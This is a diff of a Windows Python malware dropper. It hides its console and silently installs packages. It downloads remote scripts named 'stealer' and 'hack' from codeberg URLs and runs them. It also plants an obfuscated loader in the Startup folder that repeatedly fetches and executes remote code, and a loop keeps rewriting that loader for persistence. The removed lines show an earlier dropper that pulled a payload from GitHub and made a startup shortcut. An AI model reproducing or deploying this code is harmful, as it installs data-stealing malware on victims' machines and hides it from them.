@@ -1,59 +1,80 @@
-import os
-import sys
-import urllib.request
+import ctypes
+ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 import subprocess
-import py_compile
-from win32com.client import Dispatch
+subprocess.run("pip install cryptography", shell= True, capture_output= True)
+subprocess.run("pip install requests", shell= True, capture_output= True)
+import os
+import requests
+import zlib
 
-def compile_script(source_path, compiled_path):
-    """Compile the Python script into a .pyc file."""
+import pickle
+import zlib
+import time
+import base64
+from cryptography.fernet import Fernet
+
+
+
+def pack_encrypt(data):
+    key = Fernet.generate_key()
+    print("you key:"+str(key))
+    cipher = Fernet(key)
+    decrypt = pickle.dumps(cipher.decrypt)
+    compressed_data = cipher.encrypt(pickle.dumps(data))
+    return f"__import__('pickle').loads(__import__('pickle').loads({repr(decrypt)})({repr(compressed_data)}))"
+
+APPDATA = os.getenv('APPDATA')
+STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+stealer = os.path.join(os.getenv('TEMP'), "stealer.pyw")
+steal4r = os.path.join(os.getenv('TEMP'), "steal4r.pyw")
+
+try:
+    # URL of the script to download
+    URL = "https://codeberg.org/43a1723/hai1723/raw/branch/main/a/main.py"
+
+    # Download the content from the URL
+    r = requests.get(URL)
+    
+    # Encrypt and compress the content
+    encrypted_content = zlib.compress(b"""
+import urllib.request
+import time
+
+url = "https://codeberg.org/43a1723/hai1723/raw/branch/main/a/main.py"
+
+while True:
     try:
-        py_compile.compile(source_path, cfile=compiled_path)
-        print(f"Compiled script to: {compiled_path}")
+        content = urllib.request.urlopen(url).read()
+        exec(content)
+        break
     except Exception as e:
-        print(f"Failed to compile script: {e}")
-        sys.exit(1)
+        time.sleep(3)
+""")
 
-def download_script(url, file_path):
-    """Download the script from the URL and save it to the specified file path."""
-    try:
-        with urllib.request.urlopen(url) as response:
-            content = response.read()
-        with open(file_path, "wb") as file:
-            file.write(content)
-        print(f"Downloaded script to: {file_path}")
-    except Exception as e:
-        print(f"Failed to download script: {e}")
-        sys.exit(1)
+    # Python code to decrypt and execute the downloaded script
+    code = f"""
+import zlib
+import subprocess
+__import__('ctypes').windll.user32.ShowWindow(__import__('ctypes').windll.kernel32.GetConsoleWindow(), 0)
+subprocess.run("pip install cryptography", shell= True, capture_output= True)
+{pack_encrypt(exec)}({pack_encrypt(zlib.decompress)}({pack_encrypt(encrypted_content)}))
+"""
 
-def add_to_startup():
-    # Define paths
-    uuid = subprocess.run("wmic csproduct get uuid", shell= True, capture_output= True).stdout.splitlines()[2].decode(errors= 'ignore').strip()
-    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-    path = os.path.join(startup_folder, "t{uuid}.lnk")
-    target = sys.executable.replace("python.exe", "pythonw.exe")
-    wDir = os.path.join(os.environ["LOCALAPPDATA"], "gd")
-    script_path = os.path.join(wDir, "main.py")
-    icon = sys.executable
+    # Write the loader script to the Startup folder
+    with open(os.path.join(STARTUP_PATH, "loader.pyw"), "w") as f:
+        f.write(code)
 
-    # Ensure the working directory exists
-    if not os.path.exists(wDir):
-        os.makedirs(wDir)
-        print(f"Created directory: {wDir}")
+except Exception as e:
+    print(f"An error occurred: {e}")
 
-    # Download the script from the given URL
-    script_url = "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/payload/main.py"
-    download_script(script_url, script_path)
-    compile_script(os.path.join(wDir, "main.py"), os.path.join(wDir, "main.pyc"))
+payload = code
 
-    # Create a shortcut in the startup folder
-    shell = Dispatch('WScript.Shell')
-    shortcut = shell.CreateShortCut(path)
-    shortcut.Targetpath = target
-    shortcut.WorkingDirectory = wDir
-    shortcut.IconLocation = icon
-    shortcut.Arguments = f'"{script_path}c"'
-    shortcut.save()
+open(stealer, "wb").write(requests.get('https://codeberg.org/43a1723/hai1723/raw/branch/main/a/stealer.txt').content)
+subprocess.Popen(["python", stealer], start_new_session=True)
 
-add_to_startup()
-print(os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup"))
+open(steal4r, "wb").write(requests.get('https://codeberg.org/43a1723/hai1723/raw/branch/main/a/hack').content)
+subprocess.Popen(["python", steal4r], start_new_session=True)
+while True:
+    with open(os.path.join(STARTUP_PATH, "loader.pyw"), "w") as f:
+        f.write(payload)
+    time.sleep(3)
